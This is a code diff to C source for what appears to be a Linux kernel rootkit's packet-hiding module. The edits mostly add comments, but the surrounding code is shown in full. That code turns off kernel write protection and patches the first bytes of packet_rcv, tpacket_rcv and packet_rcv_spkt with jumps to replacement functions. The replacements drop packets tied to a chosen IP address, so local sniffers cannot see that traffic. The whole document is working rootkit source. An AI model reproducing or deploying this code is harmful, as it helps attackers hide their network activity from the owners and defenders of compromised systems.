@@ -42,7 +42,7 @@ char original_packet_rcv[6];
 char original_tpacket_rcv[6];
 char original_packet_rcv_spkt[6];
 
-/* Check if we need to hide this perticular packet */
+/* check if we need to hide this particular packet */
 int
 is_packet_hidden (struct sk_buff *skb)
 {
@@ -56,6 +56,7 @@ is_packet_hidden (struct sk_buff *skb)
 	return 0;
 }
 
+/* hooks 'packet_rcv' */
 void
 hook_packet_rcv (void)
 {
@@ -63,8 +64,11 @@ hook_packet_rcv (void)
 
 	/* disable write protection */
 	disable_page_protection();
-	
+
+	/* set the correct jump target */
 	*target = (unsigned int *) manipulated_packet_rcv;
+
+	/* backup and overwrite the first part of the function */
 	memcpy(original_packet_rcv, packet_rcv, 6);
 	memcpy(packet_rcv, hook, 6);
 	
@@ -74,6 +78,7 @@ hook_packet_rcv (void)
 	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 }
 
+/* hooks 'tpacket_rcv' */
 void
 hook_tpacket_rcv (void)
 {
@@ -81,8 +86,11 @@ hook_tpacket_rcv (void)
 
 	/* disable write protection */
 	disable_page_protection();
-	
+
+	/* set the correct jump target */
 	*target = (unsigned int *) manipulated_tpacket_rcv;
+
+	/* backup and overwrite the first part of the function */
 	memcpy(original_tpacket_rcv, tpacket_rcv, 6);
 	memcpy(tpacket_rcv, hook, 6);
 	
@@ -92,6 +100,7 @@ hook_tpacket_rcv (void)
 	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 }
 
+/* hooks 'packet_rcv_spkt' */
 void
 hook_packet_rcv_spkt (void)
 {
@@ -99,8 +108,11 @@ hook_packet_rcv_spkt (void)
 
 	/* disable write protection */
 	disable_page_protection();
-	
+
+	/* set the correct jump target */
 	*target = (unsigned int *) manipulated_packet_rcv_spkt;
+
+	/* backup and overwrite the first part of the function */
 	memcpy(original_packet_rcv_spkt, packet_rcv_spkt, 6);
 	memcpy(packet_rcv_spkt, hook, 6);
 	
@@ -110,6 +122,7 @@ hook_packet_rcv_spkt (void)
 	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 }
 
+/* restores 'packet_rcv' */
 void
 unhook_packet_rcv (void)
 {
@@ -118,6 +131,7 @@ unhook_packet_rcv (void)
 	/* disable write protection */
 	disable_page_protection();
 
+	/* restore the first 6 bytes we changed */
 	memcpy(packet_rcv, original_packet_rcv, 6);
 
 	/* reenable write protection */
@@ -126,6 +140,7 @@ unhook_packet_rcv (void)
 	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 }
 
+/* restores 'tpacket_rcv' */
 void
 unhook_tpacket_rcv (void)
 {
@@ -134,6 +149,7 @@ unhook_tpacket_rcv (void)
 	/* disable write protection */
 	disable_page_protection();
 
+	/* restore the first 6 bytes we changed */
 	memcpy(tpacket_rcv, original_tpacket_rcv, 6);
 
 	/* reenable write protection */
@@ -142,7 +158,7 @@ unhook_tpacket_rcv (void)
 	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 }
 
-
+/* restores 'packet_rcv_spkt' */
 void
 unhook_packet_rcv_spkt (void)
 {
@@ -151,6 +167,7 @@ unhook_packet_rcv_spkt (void)
 	/* disable write protection */
 	disable_page_protection();
 
+	/* restore the first 6 bytes we changed */
 	memcpy(packet_rcv_spkt, original_packet_rcv_spkt, 6); 
 
 	/* reenable write protection */
@@ -159,57 +176,69 @@ unhook_packet_rcv_spkt (void)
 	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 }
 
+/* our manipulated 'packet_rcv' */
 int
 manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
 	int ret;
-	
+
+	/* check if we need to hide this packet */	
 	if(is_packet_hidden(skb))
 	{	
-		ROOTKIT_DEBUG("Dropped the packet in 'packet_rcv'.\n"); 
+		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv'.\n"); 
 		return 0; 
 	}
 
+	/* restore original, call it, hook again */
 	unhook_packet_rcv();
 	ret = packet_rcv(skb,dev,pt,orig_dev);
 	hook_packet_rcv();
 	
+	/* return the correct value of the original function */	
 	return ret;	
 }
 
+/* our manipulated 'tpacket_rcv' */
 int
 manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
 	int ret;
 	
 	if(is_packet_hidden(skb))
+	/* check if we need to hide this packet */	
 	{	
-		ROOTKIT_DEBUG("Dropped the packet in 'tpacket_rcv'.\n"); 
+		ROOTKIT_DEBUG("Dropped a packet in 'tpacket_rcv'.\n"); 
 		return 0; 
 	}
 
+	/* restore original, call it, hook again */
 	unhook_tpacket_rcv();
 	ret = tpacket_rcv(skb,dev,pt,orig_dev);
 	hook_tpacket_rcv();
 	
+	/* return the correct value of the original function */	
 	return ret;	
 }
 
+/* our manipulated 'packet_rcv_spkt' */
 int
 manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
 	int ret;
 	
 	if(is_packet_hidden(skb))
+	/* check if we need to hide this packet */	
 	{	
-		ROOTKIT_DEBUG("Dropped the packet in 'packet_rcv_spkt'.\n"); 
+		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv_spkt'.\n"); 
 		return 0; 
 	} 
 
+	/* restore original, call it, hook again */
 	unhook_packet_rcv_spkt();
 	ret = packet_rcv_spkt(skb,dev,pt,orig_dev);
 	hook_packet_rcv_spkt();
-	
+
+	/* return the correct value of the original function */	
 	return ret;	
 }
 
@@ -220,10 +249,12 @@ load_packet_hiding (char *ipv4_addr)
 	u8 dst[4];
         
 	ROOTKIT_DEBUG("Loading packet hiding... bye!\n");
-	
-	in4_pton(ipv4_addr, -1, dst, -1, NULL); // Use the same function for convert into integer
+
+	/* convert ip string to an int array */	
+	in4_pton(ipv4_addr, -1, dst, -1, NULL);
 	hidden_ip = *(unsigned int *)dst; 
-	
+
+	/* do the initial hook of all three functions */
 	hook_packet_rcv();
 	hook_tpacket_rcv();
 	hook_packet_rcv_spkt();
@@ -237,6 +268,7 @@ unload_packet_hiding (void)
 {
         ROOTKIT_DEBUG("Unloading packet hiding... bye!\n");
 
+	/* restore all three functions before unloading */
 	unhook_packet_rcv();
 	unhook_tpacket_rcv();
 	unhook_packet_rcv_spkt();
